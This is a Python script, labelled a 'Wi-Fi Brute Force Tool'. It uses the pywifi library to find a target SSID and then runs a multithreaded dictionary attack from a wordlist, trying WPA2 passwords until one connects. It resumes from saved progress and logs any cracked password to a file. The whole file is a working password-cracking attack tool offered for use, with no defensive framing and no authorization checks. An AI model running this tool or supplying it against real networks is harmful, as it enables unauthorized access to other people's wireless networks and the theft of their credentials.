import pywifi
from pywifi import const
import time
import argparse
from threading import Thread, Lock
import os
import signal
import sys
from datetime import datetime

LAST_TESTED_FILE = "last_tested.txt"
FOUND_PASSWORD_FILE = "found_password.txt"

lock = Lock()

def check_ssid_availability(ssid, interface):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[interface]
    iface.scan()
    time.sleep(2)
    available_networks = iface.scan_results()
    return any(network.ssid == ssid for network in available_networks)

def check_connection(interface):
    for _ in range(10):
        if interface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(1)
    return False

def test_password(ssid, password, interface):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    interface.remove_all_network_profiles()
    temp_profile = interface.add_network_profile(profile)
    interface.connect(temp_profile)
    
    print(f"[*] Testing password: '{password}' (length: {len(password)})...")

    if check_connection(interface):
        print(f"[+] Password found: '{password}' (Connected to {ssid})")
        return True
    else:
        print(f"[-] Password '{password}' failed.")
        interface.disconnect()
        time.sleep(1)
        return False

def worker(ssid, passwords, interface, thread_id, start_idx, result_dict):
    tested_count = 0
    incorrect_count = 0
    found_password = None
    start_time = time.time()

    for idx, password in enumerate(passwords):
        current_idx = start_idx + idx
        tested_count += 1
        if result_dict.get("found"):
            break  # Exit if another thread has found the password

        if test_password(ssid, password, interface):
            with lock:
                result_dict['found'] = True
                result_dict['password'] = password
                result_dict['time_taken'] = time.time() - start_time
            break
        else:
            incorrect_count += 1

        save_progress(current_idx)

    with lock:
        result_dict['tested'] += tested_count
        result_dict['incorrect'] += incorrect_count
        if not result_dict.get("found"):
            result_dict['time_taken'] = time.time() - start_time

def save_progress(index):
    with open(LAST_TESTED_FILE, "w") as file:
        file.write(str(index))

def load_progress(total_passwords):
    if os.path.exists(LAST_TESTED_FILE):
        try:
            with open(LAST_TESTED_FILE, "r") as file:
                last_tested_index = int(file.read().strip())
                return max(0, min(last_tested_index, total_passwords - 1))
        except ValueError:
            return 0
    return 0

def signal_handler(sig, frame):
    print("\n[!] Quitting the program...")
    sys.exit(0)

def append_to_found_password_file(ssid, password):
    if not os.path.exists(FOUND_PASSWORD_FILE):
        open(FOUND_PASSWORD_FILE, "w").close()

    with open(FOUND_PASSWORD_FILE, "r+", encoding="utf-8") as file:
        entries = file.readlines()
        entry_line = f"SSID: {ssid} | Found password: {password}"
        if any(entry_line in line for line in entries):
            return  # Avoid duplicates

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        file.write(f"{entry_line} | Date: {timestamp}\n")

def main(ssid, wordlist, num_threads, start, end, interface):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[interface]

    print(f"[*] Checking availability of SSID: {ssid}...")
    if not check_ssid_availability(ssid, interface):
        print(f"[-] SSID {ssid} is not available.")
        sys.exit(1)

    with open(wordlist, "r", encoding="utf-8") as file:
        passwords = [line.strip() for line in file if line.strip()]

    try:
        start = int(start)
        end = int(end) if end is not None else len(passwords)
    except ValueError:
        print("[-] Invalid start or end index.")
        sys.exit(1)

    passwords = passwords[start:end]
    total_passwords = len(passwords)

    if total_passwords == 0:
        print("[-] No passwords to test in the specified range.")
        sys.exit(1)

    last_tested_index = load_progress(total_passwords)
    print(f"[+] Resuming from password index: {last_tested_index}")
    passwords = passwords[last_tested_index:]

    chunk_size = len(passwords) // num_threads
    threads = []
    result_dict = {'tested': 0, 'incorrect': 0, 'found': False, 'password': None, 'time_taken': 0}

    for i in range(num_threads):
        start_idx = i * chunk_size
        end_idx = None if i == num_threads - 1 else start_idx + chunk_size
        thread_passwords = passwords[start_idx:end_idx]

        thread = Thread(target=worker, args=(ssid, thread_passwords, iface, i + 1, last_tested_index + start_idx, result_dict))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if result_dict['found']:
        print(f"\n[+] Password found: '{result_dict['password']}' (SSID: {ssid})")
        append_to_found_password_file(ssid, result_dict['password'])
    else:
        print(f"\n[-] Passwords testing completed. No password found for SSID: {ssid}")
        save_progress(0)

    print("\nSummary:")
    print(f"SSID tested: {ssid}")
    print(f"Found password: {result_dict['password'] if result_dict['found'] else 'Not found'}")
    print(f"Incorrect passwords: {result_dict['incorrect']}")
    print(f"Total tested: {result_dict['tested']}")
    print(f"Time taken: {result_dict['time_taken']:.2f} seconds")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description="Wi-Fi Brute Force Tool")
    parser.add_argument("ssid", type=str, help="SSID of the Wi-Fi network")
    parser.add_argument("wordlist", type=str, help="Path to the password wordlist")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("--start", type=str, default="0", help="Start index (default: 0)")
    parser.add_argument("--end", type=str, default=None, help="End index (optional)")

    args = parser.parse_args()
    main(args.ssid, args.wordlist, args.threads, args.start, args.end, 0)
